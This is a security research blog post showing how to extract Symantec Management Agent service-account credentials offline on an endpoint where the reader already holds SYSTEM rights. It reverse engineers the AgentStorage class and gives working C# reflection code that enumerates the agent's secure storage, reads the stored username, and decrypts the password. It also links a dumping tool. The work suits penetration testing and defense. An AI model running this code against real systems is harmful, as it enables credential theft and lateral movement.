---
title: "Offline Extraction of Symantec Account Connectivity Credentials (ACCs)"
layout: "post"
categories: [ "Research" ]
tags: [ "Research" ]
---

In the [previous post](/checking-symantec-account-credentials-privesccheck/), I highlighted some of the changes made in the Symantec Management Agent, and showed how it affected the retrieval of the Account Connectivity Credentials (ACCs), based on original research by [MDSec](https://www.mdsec.co.uk/2024/12/extracting-account-connectivity-credentials-accs-from-symantec-management-agent-aka-altiris/). Although my initial intent was to implement a check for [PrivescCheck](https://github.com/itm4n/PrivescCheck), I ended up extending the research on the subject, and eventually found how to extract the credentials offline.

## Rationale

When I tried to reproduce the exploitation steps described in MDSec's blog post, to retrieve the ACCs in a privileged context, two things bothered me. First, I got this "*access denied*" error when I tried to decrypt the *Client Policy* blob obtained from the *Notification Server*.

!["Access denied" error while attempting to decrypt client policies](/assets/posts/2025-06-15-offline-extraction-of-symantec-account-connectivity-credentials/evilaltiris-high-decrypt-access-denied.png)
*"Access denied" error while attempting to decrypt client policies*

And second, I didn't like the fact that I had to interact with the *Notification Server* in the first place. I mean, once the agent is registered, and it has retrieved its policies, it is supposed to store the ACCs locally so that it can use them later on. Therefore, assuming we are in a privileged context and that we can impersonate `NT AUTHORITY\SYSTEM`, we should be able to extract those credentials locally, shouldn't we? Let's find out...

## Current Knowledge

In MDSec's article, there is this mention about the "*agent's secure storage files*" located in `C:\ProgramData\Symantec\Symantec Agent\Ldb\`. They observed that `SMATool.exe` accessed them, without saying much about them. And rightfully so, I'd say, because there isn't much to say apart from the fact that they seem to contain only encrypted data, and that further (painful) reverse engineering, of native code this time, would be necessary to figure out how to decrypt them, and then potentially decode the cleartext content. All that would have been unnecessary work overload, especially when you have a tool provided by the editor that does all the heavy lifting. But let's leave that aside for now.

![Sample secure storage file](/assets/posts/2025-06-15-offline-extraction-of-symantec-account-connectivity-credentials/hxd-sample-ldb-file.png)
*Sample secure storage file*

In the previous part, we also saw that the agent's *Client Policies* were stored in a local file, accessible to low-privileged users, except that the ACCs' username and password values were replaced by strange paths starting with the `aexs://` prefix.

![Client Policy file](/assets/posts/2025-06-11-checking-symantec-account-credentials-privesccheck/client-policy-file-accs.png)
*Client Policy file*

```xml
<PkgAccessCredentials
  UserName="aexs://AgentCore\Policy\{142F2372-E64D-43C0-A207-17DB2C0552C4}\{8A8A64CA-15B4-4371-A4A3-F24ECFF35754}"
  UserPassword="aexs://AgentCore\Policy\{142F2372-E64D-43C0-A207-17DB2C0552C4}\{854B3571-6DC3-45E8-B7D1-1647E9D81516}"
/>
```

So, I did a simple web search with the keywords `PkgAccessCredentials` and `aexs`, and found this [KB article](https://knowledge.broadcom.com/external/article/171889/failed-to-perform-reregister-read-storag.html) on Broadcom's website.

![KB article - Cause](/assets/posts/2025-06-15-offline-extraction-of-symantec-account-connectivity-credentials/kb-article-cause.png)
*KB article - Cause*

It describes an issue where an agent would fail to re-register because the `PkgAccessCredentials` node mentioned above was missing in the *Client Policy* XML file. This is just for context, but that's not really relevant for us here. What's more important, though, is the stack trace provided with the issue entries #5 and #6.

![KB article - Issue entry 6](/assets/posts/2025-06-15-offline-extraction-of-symantec-account-connectivity-credentials/kb-article-issue-entry-6.png)
*KB article - Issue entry 6*

The screenshot above shows a .NET stack trace in which we can see references to the namespace `Symantec.NSAgent`, a class named `AgentStorage`, and two of its methods, `ReadItem (String pwszItemPath, UInt32 flags)` and `ReadItemStr (String pwszItemPath, UInt32 flags)`.

Solely based on this information, we can learn, or at least guess, the following:

- A class named `AgentStorage` could be a clear indication that there exists a built-in wrapper for interacting with this so-called "*Agent Secure Storage*".
- The parameter named `pwszItemPath` could be an indication that the `aexs://` paths we saw earlier are the paths used to reference objects in this *secure storage*.
- A parameter name such as `pwszItemPath` is unusual in C# I believe, but commonly used in C, on Windows, to designate pointers (`p`) to wide (`w`) char strings (`sz`). So, there could be a relation with native code somewhere.

If we can get our hands on this assembly, it should be trivial to reverse engineer compared to `SMATool.exe` and `AeXAgentExt.dll`, which are both native binaries.

## Agent Storage Class

Fortunately, I didn't have to search for too long. After a few tries with various keywords on the *Notification Server*'s binary files, I found a promising candidate assembly with the name `Symantec.Deployment.PSComponent.dll`.

![Searching for the keyword `ReadItemStr`](/assets/posts/2025-06-15-offline-extraction-of-symantec-account-connectivity-credentials/findstr-readitemstr.png)
*Searching for the keyword `ReadItemStr`*

> Although I tend to use `findstr` by default for this kind of search, it's not necessarily the best option. The `strings(64).exe` tool from the Sysinternals' suite provides more exhaustive results. Usually, `findstr` is just faster for what I need to do.
{: .prompt-info}

And there we have it, our `Symantec.NSAgent.AgentStorage` class!

![`Symantec.NSAgent.AgentStorage` class](/assets/posts/2025-06-15-offline-extraction-of-symantec-account-connectivity-credentials/dnspy-agentstorage-class.png)
*`Symantec.NSAgent.AgentStorage` class*

Below is a stripped down version of the `AgentStorage`'s constructor, with all the error handling removed.

```csharp
public AgentStorage(string sCryptoDll, uint dwReserved) {

    // [1] Retrieve the path of AeXAgentExt.dll from the registry.
    RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(
        "Software\\\\Altiris\\\\Altiris Agent\\\\Modules\\\\x64"
    );
    sCryptoDll = registryKey.GetValue("AeXAgentExt.dll");

    // [2] Load this native library using the unmanaged API LoadLibrary.
    this.m_pStorageDll = NativeMethods.LoadLibrary(
        sCryptoDll                  // lpLibFileName
    );

    // [3] Get the address of the procedure with ordinal 100.
    IntPtr procAddress = NativeMethods.GetProcAddress(
        this.m_pStorageDll,         // hModule
        100                         // lpProcName
    );

    // [4] Call the unmanaged procedure to initialize the structure
    // `AgentStorageInterface_V3`.
    fnInitializeWrapper fnInitializeWrapper = Marshal.GetDelegateForFunctionPointer(
        procAddress,                // Unmanaged function pointer
        typeof(fnInitializeWrapper) // Type of the delegate to be returned.
    );
    AgentStorageInterface_V3 asi = new AgentStorageInterface_V3
    {
        dwVersion = 3851534083U     // 0xe591bf03
    };
    uint num = fnInitializeWrapper(ref asi);

    this.m_pfnFreeMemory = Marshal.GetDelegateForFunctionPointer(
        asi.pfnFreeMemory,          // Unmanaged function pointer
        typeof(fnFreeMemory)        // Type of the delegate to be returned.
    );

    // ...
}
```

It implements the following steps:

1. Retrieve the path of `AeXAgentExt.dll` from the registry.
2. Load this native library using the unmanaged API `LoadLibrary`.
3. Get the address of the procedure with ordinal 100.
4. Call this unmanaged procedure to initialize the structure `AgentStorageInterface_V3`.

![`AgentStorage` constructor](/assets/posts/2025-06-15-offline-extraction-of-symantec-account-connectivity-credentials/diagram-agent-storage-ctor.png)
*`AgentStorage` constructor*

A quick look at the native DLL `AeXAgentExt.dll` with [pe-bear](https://github.com/hasherezade/pe-bear) shows that it exports 3 functions, `DllRegisterServer`, `DllUnregisterServer`, which are well-known functions for [registering and unregistering COM objects](https://learn.microsoft.com/en-us/windows/win32/api/olectl/), and an unnamed one with the ordinal 100 (`0x64`).

![Exports of `AeXAgentExt.dll`](/assets/posts/2025-06-15-offline-extraction-of-symantec-account-connectivity-credentials/pe-bear-agent-dll-exports.png)
*Exports of `AeXAgentExt.dll`*

## Agent Storage Interface

The `AgentStorageInterface_V3` structure's layout is as follows. The first member is an unsigned integer representing the version of the structure, whilst all the other members are function pointers, as we observed in the class constructor's code earlier.

```csharp
[StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
internal struct AgentStorageInterface_V3
{
    public uint dwVersion;
    public IntPtr pfnFreeMemory;
    public IntPtr pfnReadItem;
    public IntPtr pfnWriteItem;
    public IntPtr pfnDeleteItem;
    public IntPtr pfnCopyItem;
    public IntPtr pfnEnumItems;
    public IntPtr pfnInitializeExpirableContext;
    public IntPtr pfnReleaseContext;
    public IntPtr pfnGetEncryptionKey;
    public IntPtr pfnEncryptData;
    public IntPtr pfnDecryptData;
    public IntPtr pfnDeleteStorage;
    // ...
}
```

The next step is evidently to open the native DLL in a disassembler such as Ghidra.

> PDB files are not provided with the binaries, so we have no information about function names. The names shown on the screenshot below were populated manually based on the names present in the `AgentStorageInterface_V3` structure of the .NET assembly.
{: .prompt-info}

![Procedure with ordinal 100 of `AeXAgentExt.dll` disassembled with Ghidra](/assets/posts/2025-06-15-offline-extraction-of-symantec-account-connectivity-credentials/ghidra-agent-dll-ordinal-100.png)
*Procedure with ordinal 100 of `AeXAgentExt.dll` disassembled with Ghidra*

What this function does is extremely simple. It receives a reference to an `AgentStorageInterface` structure. It checks its first member (`dwVersion`) to ensure that its version number is correct, and if so, populates all the other fields with the appropriate (native) function pointers. There is probably a (good?) reason why they did that, rather than exporting the functions directly, but I can't quite get it right now. :man_shrugging:

The methods of the `AgentStorage` class are mostly wrappers for those unmanaged APIs. As such, they handle all the unmanaged memory allocations and take care of converting data to and from managed types where relevant or necessary.

```csharp
public byte[] GetEncryptionKey(uint flags);
public byte[] ReadItem(string pwszItemPath, uint flags);
public SecureString ReadItemStr(string pwszItemPath, uint flags);
public void WriteItem(string pwszItemPath, byte[] data, uint flags);
public void DeleteItem(string pwszItemPath, uint flags);
public List<string> EnumItems(string pwszItemPath, uint flags);
private byte[] DecryptData(byte[] encryptedData, uint flags);
public byte[] EncryptData(byte[] pbyData, uint flags, byte[] pbyKey);
// ...
```

If you recall the stack trace I showed earlier, we are interested in the methods `ReadItemStr()` and `ReadItem()` in particular. `ReadItemStr()` does nothing special, it just invokes `ReadItem()` to get a buffer representing a Unicode string, and converts it to a .NET [`SecureString`](https://learn.microsoft.com/en-us/dotnet/api/system.security.securestring).

```csharp
public SecureString ReadItemStr(string pwszItemPath, uint flags) {
    byte[] array = this.ReadItem(pwszItemPath, flags);
    SecureString secureString = new SecureString();
    char[] chars = Encoding.Unicode.GetChars(array);
    try {
        foreach (char c in chars) {
            secureString.AppendChar(c);
        }
    }
    finally {
        Array.Clear(array, 0, array.Length);
        Array.Clear(chars, 0, chars.Length);
    }
    return secureString;
}
```

The method `ReadItem()` is the one which actually invokes the function `fnReadItem()` of the Agent Storage Interface. It passes a `DATA_BLOB` structure, which gets populated with a buffer pointer to the cleartext data if it succeeds. The buffer is then copied to a managed byte array, before being freed by calling `fnFreeMemory()` (of the Agent Storage Interface).

```csharp
public byte[] ReadItem(string pwszItemPath, uint flags) {
    DATA_BLOB data_BLOB = new DATA_BLOB {
        cbData = 0U,
        pbData = IntPtr.Zero
    };
    uint num = this.m_pfnReadItem(this._storageContext, pwszItemPath, ref data_BLOB, flags);
    byte[] array = new byte[data_BLOB.cbData];
    Marshal.Copy(data_BLOB.pbData, array, 0, (int)data_BLOB.cbData);
    this.m_pfnFreeMemory(ref data_BLOB);
    return array;
}
```

## Proof-of-Concept

We now have all the information we need to start experimenting with this assembly. For now, the idea will be to create a simple .NET console application that will allow us to confirm whether those `aexs://` paths are indeed used to access items stored in the *secure storage*.

There is only one slight issue. The `AgentStorage` class is declared as `internal`. This means that we cannot just create a .NET application and reference the assembly in our code to access it and use it. We'll have to use [.NET Reflection](https://learn.microsoft.com/en-us/dotnet/fundamentals/reflection/reflection) instead.

Among all the wrapper methods available, I felt like `EnumItems()` was a good candidate to start with.

```csharp
// Get the path of the native library AeXAgentExt.dll
RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(
    "Software\\\\Altiris\\\\Altiris Agent\\\\Modules\\\\x64"
);
string sCryptoDll = (string)registryKey.GetValue("AeXAgentExt.dll");

// Use reflection to instantiate the AgentStorage class
var asm = Assembly.LoadFile("C:\\Temp\\Symantec.Deployment.PSComponent.dll");
var type = asm.GetType("Symantec.NSAgent.AgentStorage");
var ctors = type.GetConstructors();
var obj = ctors[0].Invoke(
    new object[] {(String)sCryptoDll, (UInt32)0 }
);

// Enumerate items of the policy with ID {142F2372-E64D-43C0-A207-17DB2C0552C4}
var policy_path = "aexs://AgentCore\\Policy\\{142F2372-E64D-43C0-A207-17DB2C0552C4}";
var mthd_enumitems = type.GetMethod("EnumItems");
var res = (List<string>)mthd_enumitems.Invoke(
    obj,
    new object[] { policy_path, (UInt32)0 }
);

Console.WriteLine(policy_path);

foreach (var item in res) {
    Console.WriteLine("\\__ " + item);
}
```

![Enumerating items of the Agent Storage](/assets/posts/2025-06-15-offline-extraction-of-symantec-account-connectivity-credentials/poc-agentstorage-enumitems.png)
*Enumerating items of the Agent Storage*

> On the screenshot above, you may notice that the IDs differ from the ones shown in the previous blog post. As far as I can tell, it looks like the *Client Policy* file gets updated regularly, and each time the `UserName` and `UserPassword` are assigned a new ID. I have no idea why, but that's how it is.
{: .prompt-info}

It worked, and we can see that `EnumItems()` returned 2 items, which are precisely the ones referenced in the *Client Policy* file.

- `{1BBC72A2-C661-4E5D-A267-2456727165D7}` --> `UserName`
- `{C14B5C86-C1B8-405E-A049-EF01E21761C2}` --> `UserPassword`

We expect these two items to be strings, so the next thing to do is to try and read them using `ReadItemStr()`. This method converts the data it reads from the storage to a `SecureString`, but we can use its helper method `ConvertToUnsecureString()` to get the raw string back.

```csharp
// Get the path of the native library AeXAgentExt.dll...
// Use reflection to instantiate the AgentStorage class...

var mthd_readitemstr = type.GetMethod("ReadItemStr");
SecureString res_securestring = (SecureString)mthd_readitemstr.Invoke(
    obj,
    new object[] { args[0], (UInt32)0 }
);

var mthd_converttounsecurestring = type.GetMethod("ConvertToUnsecureString");
string res = (string)mthd_converttounsecurestring.Invoke(
    obj,
    new object[] { res_securestring }
);

Console.WriteLine(res);
```

![Reading string items from the Agent Storage](/assets/posts/2025-06-15-offline-extraction-of-symantec-account-connectivity-credentials/poc-agentstorage-readitemstr.png)
*Reading string items from the Agent Storage*

As expected, it worked, and we have successfully retrieved the ACCs' username and password. Well, almost.

## Password Decryption

The username is in cleartext, but the actual password is still encrypted. We already saw, in the previous blog post, how to decrypt it. The problem is that we used the AES key provided with the *Client Policies* to do that, but we don't have this information here. So, we'll need to find where this key is stored first. Unless there is an easier way.

You may have noticed that the list of methods I highlighted earlier contained 2 entries named `EncryptData()` and `DecryptData()`. It is very likely that these 2 functions are used precisely to produce and handle those base64-encoded blobs starting with `Aw...`.

So, I tested `DecryptData()` on the base64-encoded blob representing the ACC's password. This method takes a byte array as an input. So, I base64-decoded the data we got from the *secure storage* first, and then passed the resulting byte array as an argument.

```csharp
// Get the path of the native library AeXAgentExt.dll...
// Use reflection to instantiate the AgentStorage class...

// Get the base64 blob from the command line, and decode it.
byte[] encrypted_data = Convert.FromBase64String(args[0]);

// Pass the raw data to DecryptData
var mthd_decryptdata = type.GetMethod("DecryptData");
byte[] decrypted_data = (byte[])mthd_decryptdata.Invoke(
    obj,
    new object[] { encrypted_data, (UInt32)0 }
);

Console.WriteLine(Encoding.Unicode.GetString(decrypted_data));
```

![Decrypting data using the `AgentStorage` helper class](/assets/posts/2025-06-15-offline-extraction-of-symantec-account-connectivity-credentials/poc-agentstorage-decryptdata.png)
*Decrypting data using the `AgentStorage` helper class*

And it worked without any issues! We got our cleartext password! No need to fiddle around, or go through painful reverse engineering. :relieved:

## Conclusion

Assuming that we have local administrator privileges, and that we can impersonate `NT AUTHORITY\SYSTEM`, it is possible to extract the cleartext Account Connectivity Credentials offline, without having to interact with the *Notification Server*.

The only issue with the technique described above is that it relies on an assembly which is present only on the *Notification Server*, just like `SMATool.exe` (*cf.* previous blog post). Therefore, I cannot publish a proof-of-concept without providing this assembly along with it, and we know how this will likely end.

The thing is, this `Symantec.Deployment.PSComponent.dll` assembly is just a .NET wrapper. All it does is tap into the native library `AeXAgentExt.dll`, which is present on the endpoint machines. So, I created a tool in C/C++, [`SMAStorageDump`](https://github.com/itm4n/Pentest-Windows/tree/main/SMAStorageDump), which leverages `AeXAgentExt.dll` to extract all the data from the *agent's secure storage* recursively. On top of that, when it finds a string starting with `Aw...` it attempts to decode it and decrypt its content automatically. :wink:

![Output of SMAStorageDump showing the decrypted ACCs](/assets/posts/2025-06-15-offline-extraction-of-symantec-account-connectivity-credentials/poc-smastoragedump.png)
*Output of SMAStorageDump showing the decrypted ACCs*
